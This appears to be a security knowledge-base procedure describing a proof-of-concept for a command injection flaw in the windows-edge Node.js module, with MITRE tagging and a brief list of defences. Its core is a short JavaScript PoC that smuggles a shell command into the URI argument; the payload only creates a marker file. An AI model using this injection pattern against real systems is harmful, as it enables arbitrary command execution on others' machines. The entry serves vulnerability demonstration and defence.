---
tags:
  - rce
  - poc
  - node-js
type: procedure
tools:
  - '[[tools/Node.js]]'
tactics:
  - '[[Execution]]'
commands: []
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: aa8f778c-a206-4b39-b71c-a18cfab41ea5
created_at: '2025-12-14T17:23:20.060Z'
updated_at: '2025-12-14T17:23:20.060Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-POC-for-windows-edge-RCE

## Summary

This procedure creates a proof-of-concept JavaScript script to exploit the command injection vulnerability in the windows-edge Node.js module by passing a malicious URI to the edge function.

## Description

The windows-edge module (v1.0.1) in index.js line 8 directly interpolates the URI parameter into a shell command without sanitization, allowing injection of commands like '; touch HACKED; #'. This PoC requires the module and invokes edge with the malicious input, targeting Windows systems for arbitrary command execution.

## Requirements

1. Node.js installed on a Windows machine
2. Text editor to write the JavaScript file
3. Basic knowledge of JavaScript and shell commands

## Defense

Defensive measures and detection strategies:

- Audit and update Node.js dependencies to avoid vulnerable packages
- Implement input validation and sanitization in custom modules
- Monitor for unexpected file creations or shell executions in Node.js processes

## Objectives

1. Generate a functional PoC script for RCE demonstration
2. Test malicious URI injection
3. Prepare for vulnerability exploitation

## Instructions

### Step 1: Write the PoC Script

**Context**: Create `poc.js` that loads the vulnerable module and calls edge with injected command.

**Command** (Manual file creation):

Create `poc.js` with the following content:

```javascript
const edge = require('windows-edge');
edge({uri:'https://github.com/; touch HACKED; #'}, (err, ps)=>{
  if (err) console.error(err);
});
```

> This script requires windows-edge and passes a URI that injects 'touch HACKED' as a shell command. Expected output: No console errors if module loads.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Node.js]]

## Tags

- rce
- poc
- command-injection
